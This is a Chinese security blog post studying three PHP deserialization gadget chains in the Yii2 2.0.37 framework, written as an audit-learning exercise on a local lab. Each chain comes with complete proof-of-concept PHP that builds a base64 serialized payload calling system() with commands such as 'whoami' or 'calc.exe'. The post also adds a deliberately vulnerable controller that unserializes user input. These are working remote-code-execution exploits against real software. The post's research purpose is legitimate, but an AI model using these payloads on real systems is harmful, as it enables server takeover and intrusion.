---
title: Yii unserialize
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-09-21 15:38:39
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1175334.png
---
说来惭愧，暑假因为实习和眼睛做激光等各种原因，远远没有完成计划。这学期要收收心好好学习了。

环境搭建，github直接下载：https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz

修改下配置文件config/web.php；给cookieValidationKey修改一个任意值，不然会报错。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921202440.png)

启动，默认是8080端口。
php yii serve --port=9999

## 链一
全局寻找__destruct：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921223816.png)

我这里直接找了参考链接里面一样的点，别的点看了几个感觉也是有希望的（call_user_func等）。

__destruct调用reset，dataReader可控，所以reset调用close。
跟进close

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921224213.png)

这个close没什么可以可利用的点，再往下跟一步就是死路。但是因为dataReader参数可控，所以我们可以寻找其他可以利用的close函数。

全局搜索找到DbSession里的close

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921231015.png)

getIsActive对当前状态进行了一个判别。只有当Yii的debug和gii这两个默认扩展都存在（不一定要开启）时，这里返回true。否则返回false。

返回true后调用composeFields方法

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921232552.png)

可以看到有个call_user_func，再看下它的参数是不是可控的，不可控。

类似于call_user_func($this->test);或者$test();这种只能调用没有参数的函数的结构。出来简单的调用phpinfo以外，我们也可以考虑将变量赋值为[(new test), "aaa"]这样的一个数组。就可以调用test类中的aaa公共方法。

直接搜索含有call_user_function的无参函数
找到了yii\rest\IndexAction中的run方法

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210921234540.png)

所有参数均可控，也就是说直接调用这个即可。
构造一下：

	<?php
	namespace yii\db{
	
    	use yii\web\DbSession;
	
    	class BatchQueryResult
		{
       		private $_dataReader;
        	public function __construct(){
            	$this->_dataReader=new DbSession();
        	}
    	}
	}
	namespace yii\web{
	
    	use yii\rest\IndexAction;
	
    	class DbSession{
        	public $writeCallback;
        	public function __construct()
        	{
            	$Troy3e=new IndexAction();
            	$this->writeCallback=[$Troy3e,'run'];
        	}
    	}
	}
	namespace yii\rest{
    	class IndexAction{
        	public $checkAccess;
        	public $id;
        	public function __construct(){
            	$this->checkAccess='system';
            	$this->id='whoami';
        	}
    	}
	}
	namespace{
	
    	use yii\db\BatchQueryResult;
	
    	echo base64_encode(serialize(new BatchQueryResult()));
	}
	?>

然后在controllers目录下添加个控制器

	<?php
	namespace app\controllers;
 	
 
	class SerializeController extends \yii\web\Controller
	{
    	public function actionSerialize($data){
        	return unserialize(base64_decode($data));
    	}
	}
 	
	?>

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210922231834.png)

## 链二
还是从链一的destruct入手，上一条用了close方法，这次尝试一下call。
全局搜索__call，然后在\vendor\fzaninotto\faker\src\Faker\Generator.php找到了个合适的：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923131019.png)

跟进format，看到了call_user_func_array

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923131200.png)

看下这个是不是可控的参数

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923131528.png)

很明显这是可控的。
但是reset里面close是无参方法，传到call里面method就等于close，而attributes为空。到这里其实就很熟悉了，因为这个和链一一样，只要调用一个包含call_user_func的参数可控的无参方法即可。（方法不唯一）

	<?php

	namespace yii\db{

    	use Faker\Generator;

    	class BatchQueryResult{
        	private $_dataReader;
        	public function __construct()
        	{
            	$this->_dataReader=new Generator();
        	}
    	}
	}
	namespace Faker{

    	use yii\rest\IndexAction;

    	class Generator{
        	protected $formatters;
        	public function __construct()
        	{
            	$Troy3e=new IndexAction();
            	$this->formatters['close']=[$Troy3e,'run'];
        	}
    	}
	}
	namespace yii\rest{

    	class IndexAction{
        	public $checkAccess;
        	public $id;
        	public function __construct(){
            	$this->checkAccess='system';
            	$this->id='whoami';
        	}
    	}
	}
	namespace{

    	use yii\db\BatchQueryResult;

    	echo base64_encode(serialize(new BatchQueryResult()));
	}
	?>

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923133104.png)

## 链三
连找了两个destruct，尝试下wakeup行不行。
全局搜下来wakeup看上去能用的就四个
这次找的是\vendor\symfony\string\UnicodeString.php中的wakeup。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923133625.png)

百度一波normalizer_is_normalized这个函数，解释是检查所给的字符串是否是标准格式。老实说，这个调用toString我看了一会儿才反应过来是怎么一回事。。生疏了。

全局搜索toString，太多了，找不过来，直接参考了师傅们给的（有空一定要研究一下全局搜索的tricks：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210923142609.png)

value可控，又是一波无参方法，调用IndexAtion里的run方法即可。

	<?php
	namespace Symfony\Component\String{

    	use yii\rest\IndexAction;

    	class UnicodeString{
        	protected $string;
        	public function __construct(){
            	$Troy3e = new LazyString();
            	$this->string = $Troy3e;
        	}
    	}
    	class LazyString{
        	private $value;
        	public function __construct(){
            	$Troy3e1 = new IndexAction();
            	$this->value = [$Troy3e1,'run'];
        	}
    	}	
	}
	namespace yii\rest{

    	class IndexAction{
        	public $checkAccess;
        	public $id;
        	public function __construct(){
            	$this->checkAccess='system';
            	$this->id='calc.exe';
        	}
    	}
	}
	namespace {
    	$Troy3e2 = new Symfony\Component\String\UnicodeString();
    	echo base64_encode(serialize($Troy3e2));
	}


就先写三条吧，毕竟不是总结yii的博客，只是学习一下审计。yii的这几条链子还是非常简单的，基本没有难度。

参考：
https://xz.aliyun.com/t/8082
http://www.wangqingzheng.com/anquanke/29/217929.html